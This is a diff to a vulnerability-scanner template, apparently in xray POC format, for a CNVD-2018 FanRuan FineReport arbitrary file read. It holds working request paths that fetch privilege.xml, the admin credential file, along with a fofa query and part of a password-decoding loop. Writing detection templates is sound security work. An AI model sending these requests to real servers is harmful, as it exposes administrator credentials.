@@ -20,21 +20,28 @@ info:
           Password = Password + chr(c2)
       print (Password)
     ```
-    body="isSupportForgetPwd"
+    fofa: body="isSupportForgetPwd"
   reference:
     - https://mp.weixin.qq.com/s/339OfovdxZ98HHBXFnjOFQ
-  tags: cnvd,cnvd2018,lfi,帆软,report,fineReport,fileread
+  tags: cnvd,cnvd2018,fileread,fanruan
   created: 2020/09/11
+  requires: [fanruan]
+  requires-mode: opportunistic
 
 rules:
   r0:
+    brute:
+      mode: clusterbomb
+      commit: winner
+      continue: false
+      p:
+        - /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+        - /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
     request:
       method: GET
-      path: /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
-    expression: response.status == 200 && response.body.bcontains(b'<![CDATA[admin]]') && response.body.bcontains(b'op=fr_platform]]>') && response.body.bcontains(b'PrivilegeManager')
-  r1:
-    request:
-      method: GET
-      path: /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
-    expression: response.status == 200 && response.body.bcontains(b'<![CDATA[admin]]') && response.body.bcontains(b'op=fr_platform]]>') && response.body.bcontains(b'PrivilegeManager')
-expression: r0() || r1()
+      path: "{{p}}"
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'rootManagerName') &&
+      response.body.bcontains(b'CDATA')
+expression: r0()
